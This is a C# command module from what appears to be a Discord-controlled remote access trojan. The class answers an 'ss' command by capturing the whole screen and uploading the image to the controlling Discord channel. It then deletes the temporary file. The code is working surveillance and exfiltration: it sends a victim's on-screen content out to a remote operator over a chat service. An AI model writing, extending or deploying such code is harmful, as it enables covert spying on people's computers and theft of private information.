using System.Drawing;
using System.Runtime.InteropServices;
using Diethynylbenzene.Source.Core;
using Discord;
using Discord.WebSocket;

namespace Diethynylbenzene.Source.Commands
{
	public class Screenshot : CommandBase
	{
		public override string Name => "ss";
		public override string Description => "takes a screenshot of the current screen";

		public override async Task ExecuteAsync(SocketMessage message, string cmd, string[] args)
		{
			string? screenshot = TakeScreenshot();

			if (!String.IsNullOrEmpty(screenshot))
			{
				await message.Channel.SendFileAsync(screenshot);
				File.Delete(screenshot);
			}
			else
			{
				await message.Channel.SendMessageAsync("Failed to take screenshot.");
			}
		}

		[DllImport("user32.dll")]
		private static extern int GetSystemMetrics(int nIndex);

		private string? TakeScreenshot()
		{
			try
			{
				string screenshotPath = Path.Combine(Path.GetTempPath(), "screenshot.png");

				int width = (int)(GetSystemMetrics(0) * 1.25);
				int height = (int)(GetSystemMetrics(1) * 1.25);

				using Bitmap bitmap = new(width, height);
				using Graphics graphics = Graphics.FromImage(bitmap);

				graphics.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
				bitmap.Save(screenshotPath, System.Drawing.Imaging.ImageFormat.Png);

				return screenshotPath;
			}
			catch { return null; }
		}
	}
}